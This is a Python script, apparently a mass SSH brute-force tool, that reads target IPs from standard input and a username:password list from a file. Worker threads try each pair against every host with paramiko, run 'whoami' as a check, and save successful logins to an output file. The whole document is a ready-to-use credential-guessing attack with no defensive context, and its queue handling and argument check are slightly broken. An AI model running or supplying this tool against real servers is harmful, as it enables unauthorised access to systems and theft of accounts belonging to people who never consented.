import paramiko
import threading
import sys
import queue
import time

if len(sys.argv) < 3:
    print("Usage: python "+sys.argv[0]+" <list passs> <thread> <file out>")
    sys.exit()

listuers_passs = sys.argv[1]
max_threads = int(sys.argv[2])
output_file = sys.argv[3]
wait_time_between_attempts = 0.6  # Thời gian chờ giữa các yêu cầu đăng nhập sai mật khẩu

def test_ssh_connection(ip_address, username, password, timeout=5):
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(hostname=ip_address, username=username, password=password, timeout=timeout)

        ssh_return = ssh_client.exec_command('whoami')[1].read().decode().strip() #payload
        if f"{username}" in ssh_return:
            print(f"Đăng nhập SSH thành công vào VPS {ip_address} với {username}:{password}")
            with open(output_file, 'a', encoding='utf-8') as f:
                f.write(f"{ip_address} {username}:{password}\n")
            ssh_client.close()
            return True
        else:
            print(f"erroi {ip_address} với {username}:{password}")
            print(ssh_return)
            return False
        
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException as e:
        print(f"cônet erroi {ip_address}: {str(e)}")
        return False
    except Exception as e:
        return False

def read_credentials_from_file(filename):
    credentials = []
    with open(filename, 'r') as file:
        for line in file:
            username, password = line.strip().split(':')
            credentials.append((username, password))
    return credentials

def worker(q):
    while True:
        ip_address, credentials = q.get()
        for username, password in credentials:
            if test_ssh_connection(ip_address, username, password):
                break  
            time.sleep(wait_time_between_attempts)  
           
        else:
             print("continet time out ")
             q.task_done()

if __name__ == "__main__":   
    num_threads = max_threads
    timeout = 5
    pass_file = listuers_passs   
    credentials_list = read_credentials_from_file(pass_file)   
    q = queue.Queue()
    
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(q,))
        t.daemon = True
        t.start()

    for line in sys.stdin:
        ip_address = line.strip()
        q.put((ip_address, credentials_list))

    q.join()
